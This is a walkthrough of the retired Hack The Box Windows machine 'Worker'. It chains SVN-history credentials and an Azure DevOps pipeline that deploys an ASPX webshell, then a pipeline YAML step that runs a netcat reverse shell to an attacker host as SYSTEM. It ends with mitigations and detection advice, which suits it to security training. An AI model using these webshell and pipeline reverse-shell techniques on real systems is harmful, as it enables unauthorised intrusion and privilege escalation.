---
machine: Worker
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, svn, azure-devops, pipeline, webshell, winrm, privilege-escalation]
---

# Worker — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An old SVN repository keeps a deployment script with `nathen` credentials in its history. Those credentials open an Azure DevOps instance with several repositories and pipelines. An ASPX webshell is committed to a repository and the pipeline deploys it, yielding a shell as `iis`. The `W:` drive contains `robisl` credentials; that user can create pipelines and run them on an agent as SYSTEM.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p80,3690,5985 <IP>
```

- IIS on 80.
- SVN on 3690.
- WinRM on 5985.
- The domain is `worker.htb`.

## Enumeration

```bash
svn checkout svn://<IP> worker-svn
svn log worker-svn
svn up -r2 worker-svn
```

Revision 2 adds `deploy.ps1`, containing user `nathen` and password `<NATHEN_PASSWORD>`. Later revisions remove the secret, but history keeps it.

Vhost enumeration discovers `devops.worker.htb`, `dimension.worker.htb`, `solid-state.worker.htb` and `spectral.worker.htb`.

```bash
ffuf -u http://worker.htb -H 'Host: FUZZ.worker.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

## Foothold

`devops.worker.htb` uses NTLM authentication. With `nathen`, Azure DevOps shows the repositories and pipelines of the SmartHotel360 project.

The pipeline copies repository content to `W:\sites\<repo>.worker.htb`. Add an `.aspx` webshell to a repository and queue the pipeline; the file is published and runs as `iis`.

```aspx
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").StandardOutput.ReadToEnd()); %>
```

Upload `nc64.exe` and launch a reverse shell. `whoami` confirms `iis`.

## Lateral movement

`W:` contains `svnrepos`, `agents`, `AzureDevOpsData` and `sites`. `W:\svnrepos` holds `robisl`'s password, `<ROBISL_PASSWORD>`, which also works over WinRM.

```bash
evil-winrm -i <IP> -u robisl -p '<ROBISL_PASSWORD>'
```

`robisl` belongs to a group allowed to define builds. Read `user.txt`.

## Privilege escalation

Create a new pipeline in Azure DevOps targeting an agent in the `Setup` pool. That pool runs as SYSTEM. The pipeline only needs to launch a reverse shell:

```yaml
trigger:
  - master
pool: 'Setup'
steps:
  - script: C:\ProgramData\nc.exe -e cmd <LHOST> 443
    displayName: shell
```

When it runs, the shell arrives as `NT AUTHORITY\SYSTEM`; read `root.txt`.

## Evidence

- `svn log` and `deploy.ps1` with the password redacted.
- Screenshot of Azure DevOps and the pipeline.
- `whoami` as `iis`, `robisl` and SYSTEM.
- Redacted flag.

## Lessons learned

- SVN history keeps secrets even after they are removed from the current revision.
- A pipeline deploying arbitrary repository files is an execution path.
- Build agents may have more privileges than the user who queues the job.

## Mitigations and detection

- Rotate credentials exposed in SVN/Git history and restrict repository read access.
- Ensure pipelines do not publish arbitrary executable files.
- Run agents with low-privilege service accounts and isolate the pool.
- Alert on pipeline creation, `.aspx` deployments and child processes from agents.

## References

- <https://www.hackthebox.com/machines/Worker>
- <https://learn.microsoft.com/en-us/azure/devops/pipelines/security/overview>
- <https://attack.mitre.org/techniques/T1552/001/>
- <https://attack.mitre.org/techniques/T1072/>
